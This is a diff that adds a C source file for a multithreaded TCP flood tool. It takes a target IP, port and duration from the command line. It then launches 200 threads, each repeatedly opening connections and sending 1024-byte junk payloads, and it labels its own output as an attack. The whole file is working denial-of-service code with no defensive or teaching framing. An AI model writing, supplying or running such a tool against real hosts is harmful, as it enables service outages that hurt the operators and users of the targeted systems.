@@ -1,0 +1,64 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <pthread.h>
+#include <arpa/inet.h>
+#include <time.h>
+
+#define THREADS 200
+#define PAYLOAD_SIZE 1024
+
+char *target_ip;
+int target_port;
+int duration;
+
+void *attack_thread(void *arg) {
+    int sock;
+    struct sockaddr_in server;
+    char payload[PAYLOAD_SIZE];
+    memset(payload, 'X', PAYLOAD_SIZE); // dummy payload
+
+    server.sin_family = AF_INET;
+    server.sin_port = htons(target_port);
+    server.sin_addr.s_addr = inet_addr(target_ip);
+
+    time_t end_time = time(NULL) + duration;
+
+    while (time(NULL) < end_time) {
+        sock = socket(AF_INET, SOCK_STREAM, 0);
+        if (sock < 0) continue;
+        if (connect(sock, (struct sockaddr *)&server, sizeof(server)) >= 0) {
+            send(sock, payload, sizeof(payload), 0);
+        }
+        close(sock);
+    }
+    return NULL;
+}
+
+int main(int argc, char *argv[]) {
+    if (argc != 4) {
+        printf("Usage: %s <ip> <port> <duration>\n", argv[0]);
+        return 1;
+    }
+
+    target_ip = argv[1];
+    target_port = atoi(argv[2]);
+    duration = atoi(argv[3]);
+
+    pthread_t threads[THREADS];
+
+    printf("Starting attack on %s:%d for %d seconds with %d threads\n",
+           target_ip, target_port, duration, THREADS);
+
+    for (int i = 0; i < THREADS; i++) {
+        pthread_create(&threads[i], NULL, attack_thread, NULL);
+    }
+
+    for (int i = 0; i < THREADS; i++) {
+        pthread_join(threads[i], NULL);
+    }
+
+    printf("Attack finished.\n");
+    return 0;
+}
